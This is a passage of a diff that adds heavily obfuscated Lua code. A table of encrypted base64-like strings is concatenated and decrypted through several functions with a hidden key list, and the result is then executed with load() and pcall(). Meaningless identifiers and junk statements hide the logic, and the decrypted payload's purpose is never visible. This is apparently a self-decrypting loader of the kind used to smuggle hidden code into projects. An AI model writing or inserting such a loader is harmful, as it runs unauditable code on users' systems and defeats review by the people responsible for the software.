+_lGHIJKLMNOPQRST_0oabcd[272]='vOPpoNrvvMy906T78/3qzP+gvrnJ+7zJx/7RpMfjv+P86r/RpOSy2/v8zP7k7s7Ru9Oy8/Hjzv7tvOrR5b/mubz5zszM2Om5ue69ybz5vsPvu82g3/O/2bnZ58PB+rzT7f68/vjRvNng08O+v9rRyfH6zObj++Xju+jS++/yv+PZ+urm5fPN28rS4PvD++X+7b3g7uLZw8TZoMPu7uqzvszTzsnM3uXJ2/qgoLnS5fvO2eW+wNrM/fuyw9HD47/Z/tPvvrPp0bm+4Oig+f7l7sH9zuPjpOrEv+/O0dm/7/PN5eXT5aDD08TT5tz+6OrJ7fvvyfm47dPl/uXzoO+82cTvvsT5++rJ+/rpzPnkoL667Mzz5f/Rw+Hg0u7jsujM7tK/+/zt6tO70b3Z'
+_lGHIJKLMNOPQRST_0oabcd[273]='/fnM2/7uzMy4+tLZpOPp3MTZzOPl+L/R++C8zP+4vrn7+7/u7NLO2fv/6qC++ub+s+/qxN+gzduk+NHE+O/SzPzuztz/vsPzzfrq3N+gvsT806Dmx//p49rY0tnN4r3Du9LMoLLj6dno6ObZ+f28oP//w7nA3szb4/rp09n7ssHE6L+g8fjl2f/6vb7tu+2gzOjRyaT776S6u76g2/nM/b/e5cGz6b3m7u3NoLq8v+bN5LLE/tjq5t+86dP78uegweDvpOTRw+bM6uegweTDxOW9pO7f473JoNG/3OOy4L7J/r3+4/6/2f3jvdvY3szl5eWyw+P/zsnhvdLZuvrm4+LZzOPnvNL+2eW97eLq5tPg09LR7uqkzOLezv7H/8ztvOPp0f/yzPPnvMzc'
+_lGHIJKLMNOPQRST_0oabcd[274]='/f3OvvP+vdOk5O64w+Syyfzq5qCz09Luyf/u29m+5v668uX+7tnpyeXlvdzD+b/j36C9+7PR7tnj4ebczO/qw+jv0vv95b++5O3mwfjY4Mn7oL3m/t6gyc36vdzz+e7J36S/7rPY6dHo09G+xOnSyfv45uXv/8zl/tjl46TivPO+4Mz7svvg48fk78Gy5e3Eu9Hl0drZ6dHtvebJ+f/m8/zS6v7N4r7M+O2+2+P576Dx5L3M7NHlxMH4w6Dn+ubz7Njqw+/9vf3hv+n7yf/vzO2g5vvz4OX72+G8wfjS77m6vaTjvuXSoP+z0cTJ+rzM5eLMxPjpvMmz7uXBxNrM29m+7tzvv7/+4+WkvuLR7cza7cP72b3O5uO86bnC0+3m2tPN2/3l5rni6NL+'
+_lGHIJKLMNOPQRST_0oabcd[275]='u+7DoO/4vMzH5e7T5u28wcH5vOPb4rzz2O7M7cDZ6dm65bPM5/rl47/e7tva2um+7eDu2bqk58Tl4OnZ5u3q0fv5vO6y5MzTpPnquOX7zNPz4b3TxOm9/sDp6Nztu+fJ5bvlydrazL7nvr3M7f7p2b7jvsO/0r/u+//D7sro5v7A2erc4Orq5t+40b644OrD2eXm87PqzO7l/eb7xNjNxODRvePv8eDJw+LD09n+vtvf8ee42tLpucLazb7l+u7RwtKg7fLo5u7k6MPT+/Pl4+/l4NHY0sPR5O/g/sLv0aD+3r/7xO6+oOWgzNzD4+Dju9Pqvu29v7767unZ5bzM/tjp0aS73s3Ewum+uM36ztztsu3R7tjl4+Tq6KDx5c6goOi/5uTYw9y93uW+'
+_lGHIJKLMNOPQRST_0oabcd[276]='vPqk2b3R7tHJ+7zEzuq9vvv9vNmz2eDc+//m5dnk6rjM6OnzxOjq8+jRzbnz5My5x/vM2fvz57j67+jj8eDm5cTqvf26vrK+2eO+89jR6cza7+792+Tq5cP6vsmz0eXRw/vM2cf65aDM0s3Bv9KyoLzl6Mn5+rLDztG9w/Lo5vPjsu+gw+TRyePg4O6g6MP74/rlzOTe7u7+7s6g5bvt/vP57cy96eDu3+PD47qk5dPA3tHE2f7m0cDYzczjvOfBud69/ufx5uX+08zbv9Lg+/zR0aTa3uXu2unv88rp6Obv8+XzpOLp48HkssPu6L3R77O/0ebY6aDfv824++O90++kw8m77uDcs9rMzMrvzdvB/r3T7urm2//jw9Pk6OfMvODvvtm77r7lsuDu'
+_lGHIJKLMNOPQRST_0oabcd[277]='ud7NueLTvfO6vr3Bx+O83MLT6tP5s+rb+f2906Do6f6g6ebR6NHNoL/e7v7ju+3z2bzgybne5b7A0efz/+XtzOTR6cThu8zzxOi+887f57nt/sPc2fPS5qT/7sPjvO7J8fu92bry0u7v7Mzl+/PM/sLow8HB+uaguPvMzMLZvsH7+cy4u97RoMn66dPjoOrE3/PMw9jazNnl/uWg2unm5tje5tnN5ObEytO8oMHh5u7+6s254b/MzOX7veXY3s24+77vvsH+5dHt7Onz5NnS7u//vP7b5e7c7OrO+9/9vsH587/7vvu80f+97ty++L392N69++fgvrjs0tL7vuC+89rR0cPn4L7M+t7u7vHhvszi0tHb4fjO47PYzNzh4OfJuPrvpL76oLji073b'
+_lGHIJKLMNOPQRST_0oabcd[278]='57Lpwdn/4NnH/+3E5+TM0f35w77n5LPuverMoOW+oNzz/ubtxNHq88Hgs9nl5bzZ/urD5uzS0bm5773z3/3qwc7v7ubg0bLE5f/nyfuz58P/+dGk8eLq7vP56ua96tLR/76/0cDfvrjz4LPc4uqzvv/+zP7+7urJ//i8oLzl5b7h/+++++Xq07vYzuP66bzm8ujl7v34vdna2eXJ5+Wg3MzevPvvsuD72f7m7ePi4Pu56Obu4u3q+/m8zcT9/+rt/+Ck/sTpzubB4MzZwu3RpPu7v+O97ue++ePpvsHhvcm70u++7uqgvubtzL7n/r3+77K929jazqD40u792tOywd/94O7Zu8zu//rOycLS7rm72eCguP7SyfjZ5cnl/++4x+Pm5f+zw/7+7erj'
+_lGHIJKLMNOPQRST_0oabcd[279]='3/LD2f+45f64/+7Z5f69wcLqoMnC3qDTxNjM88DY0tm50r65uPq9w9n64P7vs7zMyeW93Nm+4Nn67b/M5urm8++9vNHD++e+2frmzObp5tzs6NLc/fvp8+zT5777ve/Byfnt3P7o6dnE7en+uPqzoO2y6NnvuOXT37LuxPH75cT66L3RztnSzLqz5cn54OXJ4/+/3OTS6tP+2s3b7O7nvt/75uXN/tLjwtPD0/3g4L7g7unEytrp/vHgvbnm0tLR4+DMzOfg0cSk/+3Rs9OyubPeoLjH5dLcyePqoMnhvb7Z5OrTzfvO4+DY4OP9+Onc+7K+wejRvvPE09LM6O6/zNnj0snvv7K5pP7q7uHs6ua57ur+6O68yfnszr7t8uDZ/+K//vjqs9G4+s7Z'
+_lGHIJKLMNOPQRST_0oabcd[280]='5fjl7qTk0uPl+Or7vvjm5ezTvO7npL/+2trq4/ngzaCk+Omg4/npoPLYv+bv4M7c8fm/zPvjw9mz2b/Z4/i/zP/658y6vO7b8+Tp/vm479vx4ObM/tnS3OXl6cH5oOn+wunl5uLp6cTY2eWg+eS80++kvMnZ7OnM8tLRoPLRw9nz5Ly5/tLmw8f66tyy48O5/N69xNrZ6aC8+ObtxNHNpPvyzbi689LJ8+zS48fhvMG/7czBv+rRoOPj0cm6v6DRuPnm073t4Mzjs+bTvv3l5vLa0u7/5L7b4fvu/uDS5r6k7M2gsuzD0+X7w9HZ7NHB3+G80+7e5u75uNHM8+DMoL/tzaC77uq5v9jp0/rfvMzv+eDZs+jp2bj55uX//eW+++PSzP+77uPH4r24'
+if I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno then _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=45 end
+if _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx then LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=100 end
+_lGHIJKLMNOPQRST_0oabcd[281]='wN7twfzT5szD5KDm+tK8xMzvv6Djv7K42/ug89m7zqDx++/B4f3l++To6dPl/+7D4b/u/ubuztG44+bluvug/vjv7v7hvszE/Nrp3L/ToPvj+enJzu/D+7/Tv9nu6e6gw/q94/LTs+bl4urMs9jpzO3j0cHluOrz2OnM7sHk5dP55ej7+7jq89vls6D46u7j++Du/sTT6rjC0+7T+/Hn28Tuvrnz4O7J57zt0eTYvMzl+L7J5/rq7uLezMy56b3j+fnD/u2k4Nz78tLjw+Ll/sLS7u7juNGk/tOg7sn/6sHJ4LP+8fm//r7k6eb83uekx/vg5v/zw8mg3u/B2tm87uTu6u3npMzMu9Lo/u376cnY7tL+v9Llydm+7aDZ/dHz2O/qucf+6cHm7+nM'
+_lGHIJKLMNOPQRST_0oabcd[282]='7/rm08f+5tvA0+65ur3ooPv50dvE7czE4NPuzLL54KDnu83JuOW9oOje6vug6b6g4OnqoMTf5tH7oMPmwtjD87qz0cH+3+bE4uro3Lj57aDv/b/Ru9jpvtn/zsnA7bzZyfvu4/P6vbjl/9Hz7+Xg0bnTzMnl4tHMx/u8wf+86vPi7+q++bPS+7ntzMz43uXj8/3NpOf50cnn/r645t6kycHg6fvj5b/+oNLD+8H7w8zJ4NLm/+TNwbL44Pvl8725pOzqyfzt0vvz47/j+NO//v+/vvPj+efD57298+Xg0vvC06TJsvm+29jtvKD9+u7c/tnm/srZ0qC6/73+/6Tqvtrv76Dv+u/E5/rl3OTpvP7tvuXz/Om83OH9w9HluL3u/eK88+bS6vu+++bz'
+_lGHIJKLMNOPQRST_0oabcd[283]='7b/O7u345sy76Oa54/nSzP/s6szi2tGg7f+/++34zsm/6eDJ5NOguaT+zu763qD9vOCkybr/0szi6urM/O3D2dv7v8zt4sOg5unlzMru4Nnz++r78ui+uLrgoMzZvMzjpPq+pOO47cT9+7/+57vmyfm7zO692MP7u+/M27nfve3u3s3M5fvp89n+5sm90uag6NLM5aDqzL7l5aDR++zMuMDtzMO70u++zfrlzMTpvrn5oL/+wNnlvuH7oNvnv73lwt6/+77kv+Pn/8zE8/uyuMrtv/7lu8zJ7O/u7qDuztG97++g8f3lye++vMS/6rPZ//rque+/6uPvsr6+7NO/7uO9vf3u6ODM+ujnw+LpzKC/0czE/u/S7vrqvPvh+6Tu+fro2bvT6fPM0bzz'
+_lGHIJKLMNOPQRST_0oabcd[284]='8eS/0drfv+747+Dc5f+87sTepMHN+ebc4bzD0fH/7e77v6Dz+bzu5fLe7cy53r++vuS95fP6oLjb+OXT/eC//tru0tHZ8+rTuuW9vszZzNOg3sPzzN6k07Ll7tnn5Ojm+tLt3Praw+7y7r3Mwfnmw+O/pO7Z4ea5vdG8ueP/0tnh5Oe4/6S95eOyv8yy5LPu2unMw9n/78n/+bzJ3+Xu7e346szJ5b6gxNK8xOjTvO7t/unMxOjnubPqvsTs6uXR2trMuO/zw/7Y2b65uuLp0cf4vb7Y7szl56C97uP60cHE7urJuri+pMPjzczZ7NG57t7RpOH+w9y65ObDs9jm0fjp0r760cPB6O3D3Pvsw9Pk0r3Bx/nl2f+kvsHx+efJ5fvlyb/T0tnB/rzJ'
+_lGHIJKLMNOPQRST_0oabcd[285]='7/rNycTT5dH807/M4f3RuPn75szh/+Djv969wcH55rjnvMzl5u/M0+Hl7v7a3sPZ2eWg/szS6sT/+tKgztLtycn9zP6y+en77+Xvyd+y6OPv4NHB4tHqxOekvcPO0rPjwOnp0bL/7e6537/M7f7NweLazaT+2unR8eDt8+Hgzr7J+87JuqTS7u2/56S/0e65u97o2cPl7/Pg6u/J4eDt2bz67tG8/8O++eXNuL3ozNHz5eXMur6yvrzl6ePi0b3TwurNoL/ZzL7+2b3t+7/uxPv/5tu+4urB+73O3OeyvcHn+Myg7fnuuMf7zqDk0+rcvdPm/sHi6sz5vO7D//7l87PpvsTfuOa47f/m2+TtzaS6+r2g/OnRuOLo5dG90czDoOrM0+zSsr7N/+65'
+_lGHIJKLMNOPQRST_0oabcd[286]='wOnmxL/e7vv+7+r947Pq2cTq5rji6tL+vv3nybL96vvz++7u7ePNpMLp5b64+L2+x+W+zNvk5snloLzj7tjpyeTa6rni2ebZ5/7RufnjvaC8+M7Jx/69yb3SpL7N/8zt4ezq2c7ozLjA2Oq5weO9+77k5dni6u7b+/7l47z7zOb/vdHBur2g5dvgvdv5uLPMuOW9/c3izLnnuNHD/NLl7ujYw766+L3Evv/RoObS7b75vuXR5aTR27z/6v3Z5aD+svvnoLvS5fPf4+nMv+rm5e34zsz7uO7j377luaT4vMnZ+uDu4NLqvuHl6uXvv73l8eTOoMrY0ubO6u6+oO3S7uX76fvK0+fDpPrmuPrvzuak4OX7wf3muMPj57jx/cz9pPjS0f7e0qDa2M7m'
+_lGHIJKLMNOPQRST_0oabcd[287]='pP283LqyzNPK7+Xu+7/O49+gztn5+6DT8f68ybnov7645bLMud7uxOH56KC4+u7E//LDxOTozMzC7+mg2N6/vuLf4LY='
+_lGHIJKLMNOPQRST_0oabcd=FGHIJKLMNOPQRSTUVWXYZabcdefghijuvwxyz_UVWXYZabcdefghijklmopqrstuvwxy1DEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrs.concat(_lGHIJKLMNOPQRST_0oabcd)
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ or 67 end
+do LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ or 47 end
+while false do break end
+do LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno or 704 end
+while false do break end
+pcall(function()end)
+do local _=530 end
+for _=5,4 do end
+do IIGHIJKLMNOI_XYZabcdefghi1=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ or 83 end
+if _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx~=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ then else end
+pcall(function()end)
+local FGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyQRSTUVWXYZabcdefghijoOHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvSTUVWXY={140,3,76,81,117,139}
+do local _=200 end
+if I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno~=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx then else end
+for _=5,2 do end
+do _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=10 end
+while false do break end
+do local _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=897 end
+do local _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=732 end
+do local _={55,40}end
+local function _0_0IJKLMNOPQI()
+local d=_lGHIJKLMNOPQRST_0oabcd
+d=TUVWXYZabcdefghijklmnopqrstuvwxyz_RSTUVUVWXYZabcdefghijklmnopqrs_MNOPQOPQRSTUVWXYZabcdefghijklmnop0(d)
+if not d or #d==0 then error('L8')end
+pcall(function()end)
+do local _={16,9}end
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=IIGHIJKLMNOI_XYZabcdefghi1 or 41 end
+do local _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=403 end
+d=_0nopqrstuvwxyKLMNOPQRSTUVWXYZabcdefghijPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_UVWXYZabcdefghijklmnopqrstuvwlmnopqrstu(d,FGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyQRSTUVWXYZabcdefghijoOHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvSTUVWXY[6])
+do local _=168 end
+for _=4,3 do end
+while false do break end
+do local _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=669 end
+d=TUVWXYZabcdefghijklmnopqrstuvwxyz_RSTUVUVWXYZabcdefghijklmnopqrs_MNOPQOPQRSTUVWXYZabcdefghijklmnop0(d)
+if not d or #d==0 then error('L6')end
+if IIGHIJKLMNOI_XYZabcdefghi1~=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno then else end
+do local _=763 end
+do local _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=685 end
+d=_0nopqrstuvwxyKLMNOPQRSTUVWXYZabcdefghijPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_UVWXYZabcdefghijklmnopqrstuvwlmnopqrstu(d,FGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyQRSTUVWXYZabcdefghijoOHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvSTUVWXY[5])
+repeat until true
+do local _=894 end
+repeat until true
+d=I1GHIJKLMHIJKLMNOPQRSTUVWXYZabcdFEFGHIJKEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy(d,FGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyQRSTUVWXYZabcdefghijoOHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvSTUVWXY[4])
+do local _={1,91}end
+do LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ or 159 end
+if LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ~=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ then else end
+do local I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=189 end
+d=_0nopqrstuvwxyKLMNOPQRSTUVWXYZabcdefghijPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_UVWXYZabcdefghijklmnopqrstuvwlmnopqrstu(d,FGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyQRSTUVWXYZabcdefghijoOHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvSTUVWXY[3])
+do _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=44 end
+while false do break end
+pcall(function()end)
+d=_IOCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstTUVWXYZabcdefghijklmnopqrstuvwO(d,FGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyQRSTUVWXYZabcdefghijoOHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvSTUVWXY[2])
+if _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx then I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=34 end
+for _=4,1 do end
+if IIGHIJKLMNOI_XYZabcdefghi1 then IIGHIJKLMNOI_XYZabcdefghi1=31 end
+do LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=28 end
+for _=1,3 do end
+d=_0nopqrstuvwxyKLMNOPQRSTUVWXYZabcdefghijPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_UVWXYZabcdefghijklmnopqrstuvwlmnopqrstu(d,FGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyQRSTUVWXYZabcdefghijoOHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvSTUVWXY[1])
+return d end
+for _=3,2 do end
+do _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno or 89 end
+if _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ then _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=61 end
+do _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ or 763 end
+repeat until true
+for _=2,3 do end
+BCDEFGHIJKLMNOPQRcdefI,HIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyABcdefghijklmnopqrstuPQRSTUVWXYZabcdjklmnopqrstuv=pcall(_0_0IJKLMNOPQI)
+if not BCDEFGHIJKLMNOPQRcdefI then error('Decrypt failed: '..tostring(HIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyABcdefghijklmnopqrstuPQRSTUVWXYZabcdjklmnopqrstuv))end
+if IIGHIJKLMNOI_XYZabcdefghi1~=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ then else end
+do local LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ=416 end
+repeat until true
+do local _={69,9}end
+pcall(function()end)
+do local I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=332 end
+_0O,OPQRSTUVWXYZabcdefghijCDEFGHIJKoABCDEFGHIJKLMNZabcdefghijklmnopqrstuvwxyBCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwIJKLMNO=load(HIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyABcdefghijklmnopqrstuPQRSTUVWXYZabcdjklmnopqrstuv)
+if not _0O then error('Load failed: '..tostring(OPQRSTUVWXYZabcdefghijCDEFGHIJKoABCDEFGHIJKLMNZabcdefghijklmnopqrstuvwxyBCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwIJKLMNO))end
+if _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_~=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx then else end
+do _1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx=99 end
+pcall(function()end)
+while false do break end
+repeat until true
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxFGHIJKLMNOPQRSTUVWXYZabcdefghijefghijkl,STUpqrstuvwlmnopqrstuvwxyzKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvFGHIJKLMNOPQRSTUVWXYZabcdefO=pcall(_0O)
+if not ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxFGHIJKLMNOPQRSTUVWXYZabcdefghijefghijkl then error('Exec failed: '..tostring(STUpqrstuvwlmnopqrstuvwxyzKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvFGHIJKLMNOPQRSTUVWXYZabcdefO))end
+pcall(function()end)
+repeat until true
+do IIGHIJKLMNOI_XYZabcdefghi1=_1OIJKLMNOPQRSTUVWXYZabcdefghiCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijkIKLMNOPQRSTUVWXYZabcdefghijklmnopqrstVWXYZabcdefghiYZabcdnopqrstuvwx or 44 end
+pcall(function()end)
+repeat until true
+if _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_~=_1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_ then else end
+do local _=971 end
+pcall(function()end)
+do IIGHIJKLMNOI_XYZabcdefghi1=66 end
+do local I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno=969 end
+if _1ILMNOPQRSTUVWXYZabcdefghijklmnopqrDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn0HIJKLMNOPQRSTUVWXYZabcdefghijkl_~=LMNOPQRSTUVWabKLMNOPQRSTUVWXYZabcdefghijklmnopqPQ then else end
+if I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno~=I1EFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxjklmnopqrstuijklmnopqrstuvRSTUVWXYZabcdefghijklmnopqrstuvwxyz_Zabcdefghijklmno then else end
+do local _={48,70}end
+while false do break end.
